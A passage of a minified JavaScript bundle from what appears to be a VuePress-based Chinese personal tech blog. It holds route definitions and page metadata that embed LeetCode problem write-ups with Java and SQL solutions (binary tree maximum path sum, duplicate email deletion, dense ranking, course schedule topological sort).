事务的提交过程.html",redirect:"/pages/dd5693/"},{name:"v-b1fbcaae",path:"/pages/f64997/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-b1fbcaae").then(t)}},{path:"/pages/f64997/index.html",redirect:"/pages/f64997/"},{path:"/06.网络/02.网络原理/02.数据链路层/00.基本概念.html",redirect:"/pages/f64997/"},{name:"v-6a62d04b",path:"/pages/57a6a5/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-6a62d04b").then(t)}},{path:"/pages/57a6a5/index.html",redirect:"/pages/57a6a5/"},{path:"/10.数据库/20.MySQL读写分离及主从时延.html",redirect:"/pages/57a6a5/"},{name:"v-b3671c30",path:"/pages/25b663/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-b3671c30").then(t)}},{path:"/pages/25b663/index.html",redirect:"/pages/25b663/"},{path:"/10.数据库/22.远程登录服务器MySql数据库时出现Access denied的解决办法 - 走看看.html",redirect:"/pages/25b663/"},{name:"v-7f2d57fe",path:"/pages/c7aa94/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-7f2d57fe").then(t)}},{path:"/pages/c7aa94/index.html",redirect:"/pages/c7aa94/"},{path:"/10.数据库/21.SQL UNION 操作符.html",redirect:"/pages/c7aa94/"},{name:"v-5ee328c8",path:"/database/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-5ee328c8").then(t)}},{path:"/database/index.html",redirect:"/database/"},{path:"/10.数据库/catalog.html",redirect:"/database/"},{name:"v-39473ee5",path:"/pages/0a3fca/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-39473ee5").then(t)}},{path:"/pages/0a3fca/index.html",redirect:"/pages/0a3fca/"},{path:"/11.消息队列/01.什么是幂等性.html",redirect:"/pages/0a3fca/"},{name:"v-0d3097c3",path:"/pages/a135d1/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-0d3097c3").then(t)}},{path:"/pages/a135d1/index.html",redirect:"/pages/a135d1/"},{path:"/11.消息队列/00.为什么要使用消息队列？.html",redirect:"/pages/a135d1/"},{name:"v-61b941f4",path:"/pages/5dde54/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-61b941f4").then(t)}},{path:"/pages/5dde54/index.html",redirect:"/pages/5dde54/"},{path:"/11.消息队列/02.那么如何设计接口才能做到幂等呢？.html",redirect:"/pages/5dde54/"},{name:"v-3e68cfb4",path:"/pages/ff9092/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-3e68cfb4").then(t)}},{path:"/pages/ff9092/index.html",redirect:"/pages/ff9092/"},{path:"/11.消息队列/03.如何保证消息传输不丢失？.html",redirect:"/pages/ff9092/"},{name:"v-0b475278",path:"/pages/eb292c/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-0b475278").then(t)}},{path:"/pages/eb292c/index.html",redirect:"/pages/eb292c/"},{path:"/11.消息队列/04.如何保证消息队列的高可用？.html",redirect:"/pages/eb292c/"},{name:"v-b5797aac",path:"/pages/5e7230/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-b5797aac").then(t)}},{path:"/pages/5e7230/index.html",redirect:"/pages/5e7230/"},{path:"/11.消息队列/05.消息队列百万消息积压在队列中如何处理？.html",redirect:"/pages/5e7230/"},{name:"v-67a8e0e4",path:"/pages/fc5594/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-67a8e0e4").then(t)}},{path:"/pages/fc5594/index.html",redirect:"/pages/fc5594/"},{path:"/11.消息队列/06.消息队列如果保证消息的重复消费？（幂等性）.html",redirect:"/pages/fc5594/"},{name:"v-327e57e0",path:"/pages/427056/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-327e57e0").then(t)}},{path:"/pages/427056/index.html",redirect:"/pages/427056/"},{path:"/11.消息队列/07.消息队列如何保证消息的顺序性？.html",redirect:"/pages/427056/"},{name:"v-0a311fbb",path:"/pages/fc28da/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-0a311fbb").then(t)}},{path:"/pages/fc28da/index.html",redirect:"/pages/fc28da/"},{path:"/11.消息队列/08.消息中间件的应用场景.html",redirect:"/pages/fc28da/"},{name:"v-1511a062",path:"/pages/1dd0a5/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-1511a062").then(t)}},{path:"/pages/1dd0a5/index.html",redirect:"/pages/1dd0a5/"},{path:"/11.消息队列/09.消息队列的缺点.html",redirect:"/pages/1dd0a5/"},{name:"v-50e3afbe",path:"/pages/a350a0/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-50e3afbe").then(t)}},{path:"/pages/a350a0/index.html",redirect:"/pages/a350a0/"},{path:"/11.消息队列/10.MQ产品的比较.html",redirect:"/pages/a350a0/"},{name:"v-c5579ed0",path:"/mq/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-c5579ed0").then(t)}},{path:"/mq/index.html",redirect:"/mq/"},{path:"/11.消息队列/catalog.html",redirect:"/mq/"},{name:"v-1f6eb0be",path:"/pages/79e948/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-1f6eb0be").then(t)}},{path:"/pages/79e948/index.html",redirect:"/pages/79e948/"},{path:"/12.微服务/01.分布式服务接口请求的顺序如何保证？.html",redirect:"/pages/79e948/"},{name:"v-20b7b93b",path:"/pages/cccdf5/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-20b7b93b").then(t)}},{path:"/pages/cccdf5/index.html",redirect:"/pages/cccdf5/"},{path:"/12.微服务/02.如何设计一个高并发系统.html",redirect:"/pages/cccdf5/"},{name:"v-08281882",path:"/pages/0981d9/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-08281882").then(t)}},{path:"/pages/0981d9/index.html",redirect:"/pages/0981d9/"},{path:"/12.微服务/03.一致性hash算法.html",redirect:"/pages/0981d9/"},{name:"v-b945b45c",path:"/pages/ff6bd1/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-b945b45c").then(t)}},{path:"/pages/ff6bd1/index.html",redirect:"/pages/ff6bd1/"},{path:"/12.微服务/04.dubbo负载均衡策略.html",redirect:"/pages/ff6bd1/"},{name:"v-5598df1b",path:"/microservice/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-5598df1b").then(t)}},{path:"/microservice/index.html",redirect:"/microservice/"},{path:"/12.微服务/catalog.html",redirect:"/microservice/"},{name:"v-52a39b45",path:"/archives/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-52a39b45").then(t)}},{path:"/archives/index.html",redirect:"/archives/"},{path:"/@pages/archivesPage.html",redirect:"/archives/"},{name:"v-41a9b6a5",path:"/categories/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-41a9b6a5").then(t)}},{path:"/categories/index.html",redirect:"/categories/"},{path:"/@pages/categoriesPage.html",redirect:"/categories/"},{name:"v-d0167e76",path:"/tags/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-d0167e76").then(t)}},{path:"/tags/index.html",redirect:"/tags/"},{path:"/@pages/tagsPage.html",redirect:"/tags/"},{name:"v-485a7d47",path:"/pages/2e2879/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-485a7d47").then(t)}},{path:"/pages/2e2879/index.html",redirect:"/pages/2e2879/"},{path:"/_posts/其他/Windows Terminal美化（oh-my-posh3）.html",redirect:"/pages/2e2879/"},{name:"v-36419016",path:"/pages/6dd8cf/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-36419016").then(t)}},{path:"/pages/6dd8cf/index.html",redirect:"/pages/6dd8cf/"},{path:"/_posts/其他/电子书下载.html",redirect:"/pages/6dd8cf/"},{name:"v-27a24cd8",path:"/pages/cd2372/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-27a24cd8").then(t)}},{path:"/pages/cd2372/index.html",redirect:"/pages/cd2372/"},{path:"/_posts/随笔/关于弱密码的反思2022-05-29.html",redirect:"/pages/cd2372/"},{name:"v-c4eaae76",path:"/about/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-c4eaae76").then(t)}},{path:"/about/index.html",redirect:"/about/"},{path:"/about.html",redirect:"/about/"},{name:"v-35ef0056",path:"/collection/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-35ef0056").then(t)}},{path:"/collection/index.html",redirect:"/collection/"},{path:"/collection.html",redirect:"/collection/"},{name:"v-7f55e15e",path:"/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-7f55e15e").then(t)}},{path:"/index.html",redirect:"/"},{name:"v-3e5dc954",path:"/pages/db22b6/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-3e5dc954").then(t)}},{path:"/pages/db22b6/index.html",redirect:"/pages/db22b6/"},{path:"/08.软件使用/13.其他/06.windows 远程桌面连接 界面不一样的解决方案 如何切换会话.html",redirect:"/pages/db22b6/"},{name:"v-3ef59e16",path:"/pages/9db3a9/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-3ef59e16").then(t)}},{path:"/pages/9db3a9/index.html",redirect:"/pages/9db3a9/"},{path:"/06.网络/02.网络原理/02.数据链路层/01.三个基本问题.html",redirect:"/pages/9db3a9/"},{path:"*",component:bl}],yl={title:"",description:"",base:"/",headTags:[["link",{rel:"icon",href:"/img/logo.png"}],["meta",{name:"keywords",content:"个人技术博客,技术文档,学习,github,markdown"}],["meta",{name:"theme-color",content:"#11a8cd"}]],pages:[{title:"二叉树中的最大路径和",frontmatter:{title:"二叉树中的最大路径和",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/c0018a/",categories:["leetcode"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/01.leetcode/124.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E7%9A%84%E6%9C%80%E5%A4%A7%E8%B7%AF%E5%BE%84%E5%92%8C.html",relativePath:"01.数据结构与算法/01.leetcode/124. 二叉树中的最大路径和.md",key:"v-a197b1f0",path:"/pages/c0018a/",headers:[{level:2,title:"1. 题目",slug:"_1-题目",normalizedTitle:"1. 题目",charIndex:2},{level:2,title:"2. 解答",slug:"_2-解答",normalizedTitle:"2. 解答",charIndex:438},{level:2,title:"3. 思路",slug:"_3-思路",normalizedTitle:"3. 思路",charIndex:877}],headersStr:"1. 题目 2. 解答 3. 思路",content:"# 1. 题目\n\n路径 被定义为一条从树中任意节点出发，沿父节点-子节点连接，达到任意节点的序列。同一个节点在一条路径序列中 至多出现一次 。该路径 至少包含一个 节点，且不一定经过根节点。\n\n路径和 是路径中各节点值的总和。\n\n给你一个二叉树的根节点 root ，返回其 最大路径和 。\n\n示例 1：\n\n\n\n输入：root = [1,2,3]\n输出：6\n解释：最优路径是 2 -> 1 -> 3 ，路径和为 2 + 1 + 3 = 6\n\n\n1\n2\n3\n\n\n示例 2：\n\n\n\n输入：root = [-10,9,20,null,null,15,7]\n输出：42\n解释：最优路径是 15 -> 20 -> 7 ，路径和为 15 + 20 + 7 = 42\n\n\n\n1\n2\n3\n4\n\n\n提示：\n\n * 树中节点数目范围是 [1, 3 * 10<sup>4</sup>]\n * -1000 <= Node.val <= 1000\n\n相关标签 树 深度优先搜索 动态规划 二叉树\n\n\n# 2. 解答\n\nInteger result = Integer.MIN_VALUE;\npublic int maxPathSum(TreeNode root) {\n\tif (root==null) return 0;\n\tonePathSum(root);\n\treturn result;\n}\n\nprivate int onePathSum(TreeNode root) {\n\tif (root==null) return 0;\n\tint left = Math.max(onePathSum(root.left),0);\n\tint right = Math.max(onePathSum(root.right),0);\n\tresult = Math.max(result,left+right+root.val);\n\treturn root.val+Math.max(left,right);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 3. 思路\n\n参考：https://www.bilibili.com/video/BV1ct411r7qw 自己的理解记录： 取出二叉树中的一小部分，如下 很明显，对于这样二叉树 当a-b是连接的，则b-e,b-f只能有一个连接 如果b-e,b-f 均连接 ，则a-b不能连接\n\n对于这颗二叉树，路径分为经过a和不经过a\n\n 1. 如果经过a 则 路径和有a+b只连接其中一条边的路径和+c只连接其中一条边的路径和\n 2. 如果不经过a 则 路径和为 b的路径和 或者 c的路径和 也就是这个二叉树子树的最大路径和 即 一颗二叉树的最大路径和 是经过a的最大路径和 与 其子树的最大路径和 中最大的一个\n\n则从a开始递归调用条件1 那么每次调用的时候都能求出其子树的最大路径和，将这个记录下来 ，如有更大的则覆盖",normalizedContent:"# 1. 题目\n\n路径 被定义为一条从树中任意节点出发，沿父节点-子节点连接，达到任意节点的序列。同一个节点在一条路径序列中 至多出现一次 。该路径 至少包含一个 节点，且不一定经过根节点。\n\n路径和 是路径中各节点值的总和。\n\n给你一个二叉树的根节点 root ，返回其 最大路径和 。\n\n示例 1：\n\n\n\n输入：root = [1,2,3]\n输出：6\n解释：最优路径是 2 -> 1 -> 3 ，路径和为 2 + 1 + 3 = 6\n\n\n1\n2\n3\n\n\n示例 2：\n\n\n\n输入：root = [-10,9,20,null,null,15,7]\n输出：42\n解释：最优路径是 15 -> 20 -> 7 ，路径和为 15 + 20 + 7 = 42\n\n\n\n1\n2\n3\n4\n\n\n提示：\n\n * 树中节点数目范围是 [1, 3 * 10<sup>4</sup>]\n * -1000 <= node.val <= 1000\n\n相关标签 树 深度优先搜索 动态规划 二叉树\n\n\n# 2. 解答\n\ninteger result = integer.min_value;\npublic int maxpathsum(treenode root) {\n\tif (root==null) return 0;\n\tonepathsum(root);\n\treturn result;\n}\n\nprivate int onepathsum(treenode root) {\n\tif (root==null) return 0;\n\tint left = math.max(onepathsum(root.left),0);\n\tint right = math.max(onepathsum(root.right),0);\n\tresult = math.max(result,left+right+root.val);\n\treturn root.val+math.max(left,right);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 3. 思路\n\n参考：https://www.bilibili.com/video/bv1ct411r7qw 自己的理解记录： 取出二叉树中的一小部分，如下 很明显，对于这样二叉树 当a-b是连接的，则b-e,b-f只能有一个连接 如果b-e,b-f 均连接 ，则a-b不能连接\n\n对于这颗二叉树，路径分为经过a和不经过a\n\n 1. 如果经过a 则 路径和有a+b只连接其中一条边的路径和+c只连接其中一条边的路径和\n 2. 如果不经过a 则 路径和为 b的路径和 或者 c的路径和 也就是这个二叉树子树的最大路径和 即 一颗二叉树的最大路径和 是经过a的最大路径和 与 其子树的最大路径和 中最大的一个\n\n则从a开始递归调用条件1 那么每次调用的时候都能求出其子树的最大路径和，将这个记录下来 ，如有更大的则覆盖",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"删除重复的电子邮箱",frontmatter:{title:"删除重复的电子邮箱",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/982656/",categories:["leetcode"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/01.leetcode/196.%20%E5%88%A0%E9%99%A4%E9%87%8D%E5%A4%8D%E7%9A%84%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1.html",relativePath:"01.数据结构与算法/01.leetcode/196. 删除重复的电子邮箱.md",key:"v-4a2865d5",path:"/pages/982656/",headers:[{level:2,title:"1. 题目",slug:"_1-题目",normalizedTitle:"1. 题目",charIndex:2},{level:2,title:"2. 解答",slug:"_2-解答",normalizedTitle:"2. 解答",charIndex:260},{level:2,title:"3. 注意事项",slug:"_3-注意事项",normalizedTitle:"3. 注意事项",charIndex:376}],headersStr:"1. 题目 2. 解答 3. 注意事项",content:"# 1. 题目\n\n> 难度：简单 编写一个 SQL 查询，来删除 Person 表中所有重复的电子邮箱，重复的邮箱里只保留 Id 最小 的那个。\n\nID   EMAIL\n1    john@example.com\n2    bob@example.com\n3    john@example.com\n\nId 是这个表的主键。 例如，在运行你的查询语句之后，上面的 Person 表应返回以下几行: |\n\nID   EMAIL\n1    john@example.com\n2    bob@example.com\n\n\n# 2. 解答\n\nDELETE  FROM person\nwhere id not in \n(\n\tSELECT min(id) as m_id FROM person GROUP BY email\n)\n\n\n1\n2\n3\n4\n5\n\n\n\n# 3. 注意事项\n\n这道题使用MySql 写成\n\nDELETE  FROM person\nwhere id not in \n(\n\tSELECT min(id) as m_id FROM person GROUP BY email\n)\n\n\n1\n2\n3\n4\n5\n\n\n会报错 解决方法: mysql 出现You can't specify target table for update in FROM clause错误的解决方法",normalizedContent:"# 1. 题目\n\n> 难度：简单 编写一个 sql 查询，来删除 person 表中所有重复的电子邮箱，重复的邮箱里只保留 id 最小 的那个。\n\nid   email\n1    john@example.com\n2    bob@example.com\n3    john@example.com\n\nid 是这个表的主键。 例如，在运行你的查询语句之后，上面的 person 表应返回以下几行: |\n\nid   email\n1    john@example.com\n2    bob@example.com\n\n\n# 2. 解答\n\ndelete  from person\nwhere id not in \n(\n\tselect min(id) as m_id from person group by email\n)\n\n\n1\n2\n3\n4\n5\n\n\n\n# 3. 注意事项\n\n这道题使用mysql 写成\n\ndelete  from person\nwhere id not in \n(\n\tselect min(id) as m_id from person group by email\n)\n\n\n1\n2\n3\n4\n5\n\n\n会报错 解决方法: mysql 出现you can't specify target table for update in from clause错误的解决方法",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"分数排名",frontmatter:{title:"分数排名",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/795a2d/",categories:["leetcode"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/01.leetcode/178.%20%E5%88%86%E6%95%B0%E6%8E%92%E5%90%8D.html",relativePath:"01.数据结构与算法/01.leetcode/178. 分数排名.md",key:"v-659b0039",path:"/pages/795a2d/",headers:[{level:2,title:"1. 题目",slug:"_1-题目",normalizedTitle:"1. 题目",charIndex:2},{level:2,title:"2. 解答",slug:"_2-解答",normalizedTitle:"2. 解答",charIndex:583},{level:2,title:"3. 参考",slug:"_3-参考",normalizedTitle:"3. 参考",charIndex:673}],headersStr:"1. 题目 2. 解答 3. 参考",content:"# 1. 题目\n\n> 难度：中等\n\n编写一个 SQL 查询来实现分数排名。\n\n如果两个分数相同，则两个分数排名（Rank）相同。请注意，平分后的下一个名次应该是下一个连续的整数值。换句话说，名次之间不应该有“间隔”。\n\n+----+-------+\n| Id | Score |\n+----+-------+\n| 1  | 3.50  |\n| 2  | 3.65  |\n| 3  | 4.00  |\n| 4  | 3.85  |\n| 5  | 4.00  |\n| 6  | 3.65  |\n+----+-------+\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n例如，根据上述给定的 Scores 表，你的查询应该返回（按分数从高到低排列）：\n\n+-------+------+\n| Score | Rank |\n+-------+------+\n| 4.00  | 1    |\n| 4.00  | 1    |\n| 3.85  | 2    |\n| 3.65  | 3    |\n| 3.65  | 3    |\n| 3.50  | 4    |\n+-------+------+\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n重要提示：对于 MySQL 解决方案，如果要转义用作列名的保留字，可以在关键字之前和之后使用撇号。例如 Rank\n\n\n# 2. 解答\n\nselect Score,dense_rank() over(order by score desc) as `Rank` from Scores\n\n\n1\n\n\n\n# 3. 参考\n\nsql排名函数 RANK，DENSE_RANK和ROW_NUMBER",normalizedContent:"# 1. 题目\n\n> 难度：中等\n\n编写一个 sql 查询来实现分数排名。\n\n如果两个分数相同，则两个分数排名（rank）相同。请注意，平分后的下一个名次应该是下一个连续的整数值。换句话说，名次之间不应该有“间隔”。\n\n+----+-------+\n| id | score |\n+----+-------+\n| 1  | 3.50  |\n| 2  | 3.65  |\n| 3  | 4.00  |\n| 4  | 3.85  |\n| 5  | 4.00  |\n| 6  | 3.65  |\n+----+-------+\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n例如，根据上述给定的 scores 表，你的查询应该返回（按分数从高到低排列）：\n\n+-------+------+\n| score | rank |\n+-------+------+\n| 4.00  | 1    |\n| 4.00  | 1    |\n| 3.85  | 2    |\n| 3.65  | 3    |\n| 3.65  | 3    |\n| 3.50  | 4    |\n+-------+------+\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n重要提示：对于 mysql 解决方案，如果要转义用作列名的保留字，可以在关键字之前和之后使用撇号。例如 rank\n\n\n# 2. 解答\n\nselect score,dense_rank() over(order by score desc) as `rank` from scores\n\n\n1\n\n\n\n# 3. 参考\n\nsql排名函数 rank，dense_rank和row_number",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"课程表 II",frontmatter:{title:"课程表 II",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/df92d1/",categories:["leetcode"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/01.leetcode/210.%20%E8%AF%BE%E7%A8%8B%E8%A1%A8%20II.html",relativePath:"01.数据结构与算法/01.leetcode/210. 课程表 II.md",key:"v-7468d340",path:"/pages/df92d1/",headers:[{level:2,title:"1. 题目",slug:"_1-题目",normalizedTitle:"1. 题目",charIndex:2},{level:2,title:"2. 代码",slug:"_2-代码",normalizedTitle:"2. 代码",charIndex:1044},{level:2,title:"3. 思路",slug:"_3-思路",normalizedTitle:"3. 思路",charIndex:2215}],headersStr:"1. 题目 2. 代码 3. 思路",content:"# 1. 题目\n\n现在你总共有 numCourses 门课需要选，记为 0 到 numCourses - 1。给你一个数组 prerequisites ，其中 $prerequisites[i] = [a_i, b_i]$ ，表示在选修课程 $a_i$ 前 必须 先选修 $b_i$ 。\n\n * 例如，想要学习课程 0 ，你需要先完成课程 1 ，我们用一个匹配来表示：[0,1] 。\n\n返回你为了学完所有课程所安排的学习顺序。可能会有多个正确的顺序，你只要返回 任意一种 就可以了。如果不可能完成所有课程，返回 一个空数组 。\n\n示例 1：\n\n输入：numCourses = 2, prerequisites = [[1,0]]\n输出：[0,1]\n解释：总共有 2 门课程。要学习课程 1，你需要先完成课程 0。因此，正确的课程顺序为 `[0,1] 。`\n\n\n\n1\n2\n3\n4\n\n\n示例 2：\n\n输入：numCourses = 4, prerequisites = [[1,0],[2,0],[3,1],[3,2]]\n输出：[0,2,1,3]\n解释：总共有 4 门课程。要学习课程 3，你应该先完成课程 1 和课程 2。并且课程 1 和课程 2 都应该排在课程 0 之后。\n因此，一个正确的课程顺序是 `[0,1,2,3]` 。另一个正确的排序是 `[0,2,1,3]` 。\n\n\n1\n2\n3\n4\n\n\n示例 3：\n\n输入：numCourses = 1, prerequisites = []\n输出：[0]\n\n\n\n1\n2\n3\n\n\n提示：\n\n * $1 <= numCourses <= 2000$\n * $0 <= prerequisites.length <= numCourses * (numCourses - 1)$\n * $prerequisites[i].length == 2$\n * $0 <= a_i, b_i < numCourses$\n * $a_i != b_i$\n * 所有$[a_i, b_i]$ 匹配 互不相同\n\n拓展：\n\n * 这个问题相当于查找一个循环是否存在于有向图中。如果存在循环，则不存在拓扑排序，因此不可能选取所有课程进行学习。\n * 通过 DFS 进行拓扑排序 - 一个关于Coursera的精彩视频教程（21分钟），介绍拓扑排序的基本概念。\n * 拓扑排序也可以通过 BFS 完成。\n\n相关标签 深度优先搜索 广度优先搜索 图 拓扑排序\n\n\n# 2. 代码\n\n    int[] visit;\n    List<Integer>[] listArray;\n    Stack<Integer> stack;\n\n    public int[] findOrder(int numCourses, int[][] prerequisites) {\n        stack = new Stack<>();\n        visit = new int[numCourses];\n        listArray= new List[numCourses];\n        for (int i = 0; i < numCourses; i++) {\n            listArray[i] = new ArrayList<>();\n        }\n        for(int[] num:prerequisites){\n            listArray[num[1]].add(num[0]);\n        }\n        for (int i = 0; i < numCourses; i++) {\n            if(visit[i]==0) {\n                if(dfs(i)==false) return new int[0];\n            }\n        }\n        int[] result = new int[numCourses];\n        for (int i = 0; i < numCourses; i++) {\n            result[i]=stack.pop();\n        }\n        return result;\n    }\n\n    private boolean dfs(int i){\n        if(visit[i]==1) return false;\n        if(visit[i]==2) return true;\n        visit[i] = 1;\n        for(int j : listArray[i]){\n            if(dfs(j)==false) return false;\n        }\n        visit[i] = 2;\n        stack.add(i);\n        return true;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n\n# 3. 思路\n\n使用深度优先搜索来搜索图\n\n图的深度优先搜索 因为整个图不一定是连通图 需要对每个节点进行遍历的来一次深度优先搜索\n\n为了避免重复遍历 需要一个visit[]数组来记录节点是否被访问过\n\n而这道题需要将visit[]数组的状态增加一个访问中的状态 即visit[]数组的值可以设置为 0 ，1 ，2\n\n * 0 表示未访问过\n * 1 表示正在访问\n * 2 表示已经访问过\n\n如果处于访问中的状态的结点，再次被遍历到则就被视为存在环 ，则不能够被拓扑排序\n\n否则访问完成的直接入栈，然后在栈底的节点就是最后还修的课程，在栈顶的节点是一开始需要修的课程，所以全部出栈后的序列则是结果",normalizedContent:"# 1. 题目\n\n现在你总共有 numcourses 门课需要选，记为 0 到 numcourses - 1。给你一个数组 prerequisites ，其中 $prerequisites[i] = [a_i, b_i]$ ，表示在选修课程 $a_i$ 前 必须 先选修 $b_i$ 。\n\n * 例如，想要学习课程 0 ，你需要先完成课程 1 ，我们用一个匹配来表示：[0,1] 。\n\n返回你为了学完所有课程所安排的学习顺序。可能会有多个正确的顺序，你只要返回 任意一种 就可以了。如果不可能完成所有课程，返回 一个空数组 。\n\n示例 1：\n\n输入：numcourses = 2, prerequisites = [[1,0]]\n输出：[0,1]\n解释：总共有 2 门课程。要学习课程 1，你需要先完成课程 0。因此，正确的课程顺序为 `[0,1] 。`\n\n\n\n1\n2\n3\n4\n\n\n示例 2：\n\n输入：numcourses = 4, prerequisites = [[1,0],[2,0],[3,1],[3,2]]\n输出：[0,2,1,3]\n解释：总共有 4 门课程。要学习课程 3，你应该先完成课程 1 和课程 2。并且课程 1 和课程 2 都应该排在课程 0 之后。\n因此，一个正确的课程顺序是 `[0,1,2,3]` 。另一个正确的排序是 `[0,2,1,3]` 。\n\n\n1\n2\n3\n4\n\n\n示例 3：\n\n输入：numcourses = 1, prerequisites = []\n输出：[0]\n\n\n\n1\n2\n3\n\n\n提示：\n\n * $1 <= numcourses <= 2000$\n * $0 <= prerequisites.length <= numcourses * (numcourses - 1)$\n * $prerequisites[i].length == 2$\n * $0 <= a_i, b_i < numcourses$\n * $a_i != b_i$\n * 所有$[a_i, b_i]$ 匹配 互不相同\n\n拓展：\n\n * 这个问题相当于查找一个循环是否存在于有向图中。如果存在循环，则不存在拓扑排序，因此不可能选取所有课程进行学习。\n * 通过 dfs 进行拓扑排序 - 一个关于coursera的精彩视频教程（21分钟），介绍拓扑排序的基本概念。\n * 拓扑排序也可以通过 bfs 完成。\n\n相关标签 深度优先搜索 广度优先搜索 图 拓扑排序\n\n\n# 2. 代码\n\n    int[] visit;\n    list<integer>[] listarray;\n    stack<integer> stack;\n\n    public int[] findorder(int numcourses, int[][] prerequisites) {\n        stack = new stack<>();\n        visit = new int[numcourses];\n        listarray= new list[numcourses];\n        for (int i = 0; i < numcourses; i++) {\n            listarray[i] = new arraylist<>();\n        }\n        for(int[] num:prerequisites){\n            listarray[num[1]].add(num[0]);\n        }\n        for (int i = 0; i < numcourses; i++) {\n            if(visit[i]==0) {\n                if(dfs(i)==false) return new int[0];\n            }\n        }\n        int[] result = new int[numcourses];\n        for (int i = 0; i < numcourses; i++) {\n            result[i]=stack.pop();\n        }\n        return result;\n    }\n\n    private boolean dfs(int i){\n        if(visit[i]==1) return false;\n        if(visit[i]==2) return true;\n        visit[i] = 1;\n        for(int j : listarray[i]){\n            if(dfs(j)==false) return false;\n        }\n        visit[i] = 2;\n        stack.add(i);\n        return true;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n\n# 3. 思路\n\n使用深度优先搜索来搜索图\n\n图的深度优先搜索 因为整个图不一定是连通图 需要对每个节点进行遍历的来一次深度优先搜索\n\n为了避免重复遍历 需要一个visit[]数组来记录节点是否被访问过\n\n而这道题需要将visit[]数组的状态增加一个访问中的状态 即visit[]数组的值可以设置为 0 ，1 ，2\n\n * 0 表示未访问过\n * 1 表示正在访问\n * 2 表示已经访问过\n\n如果处于访问中的状态的结点，再次被遍历到则就被视为存在环 ，则不能够被拓扑排序\n\n否则访问完成的直接入栈，然后在栈底的节点就是最后还修的课程，在栈顶的节点是一开始需要修的课程，所以全部出栈后的序列则是结果",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"摆动排序 II",frontmatter:{title:"摆动排序 